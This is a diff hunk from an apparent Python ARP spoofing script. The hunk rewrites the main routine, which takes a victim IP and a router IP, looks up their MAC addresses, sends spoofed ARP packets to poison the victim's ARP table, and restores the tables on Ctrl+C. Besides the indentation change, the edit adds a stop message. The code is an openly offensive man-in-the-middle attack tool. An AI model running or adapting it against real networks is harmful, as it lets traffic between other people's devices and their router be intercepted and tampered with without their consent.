@@ -34,25 +34,25 @@ def send_arp_spoof_packets(victim_ip, victim_mac, router_ip):
         #time.sleep(1)
 
 def main():
-    check_root()
-    
-    victim_ip = sys.argv[1]
-    router_ip = sys.argv[2] if len(sys.argv) > 2 else get_gateway_ip()
+	check_root()
 
-    victim_mac = getmacbyip(victim_ip)
-    router_mac = getmacbyip(router_ip)
+	victim_ip = sys.argv[1]
+	router_ip = sys.argv[2] if len(sys.argv) > 2 else get_gateway_ip()
 
-    print("Sending spoofed ARP packets")
-    print("Router IP:", router_ip)
-    print("Target IP:", victim_ip)
+	victim_mac = getmacbyip(victim_ip)
+	router_mac = getmacbyip(router_ip)
 
-    try:
-        send_arp_spoof_packets(victim_ip, victim_mac, router_ip)
-    except KeyboardInterrupt:
-        print("\nRestoring ARP Tables")
-        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
-        arp_restore(router_ip, getmacbyip(router_ip), victim_ip, victim_mac)
-        print("ARP tables restored.")
+	print("Sending spoofed ARP packets")
+	print("Router IP:", router_ip)
+	print("Target IP:", victim_ip)
+	try:
+		print("To stop press CTRL+C")
+		send_arp_spoof_packets(victim_ip, victim_mac, router_ip)
+	except KeyboardInterrupt:
+		print("\nRestoring ARP Tables")
+		arp_restore(victim_ip, victim_mac, router_ip, router_mac)
+		arp_restore(router_ip, getmacbyip(router_ip), victim_ip, victim_mac)
+		print("ARP tables restored.")
 
 if __name__ == "__main__":
     main()
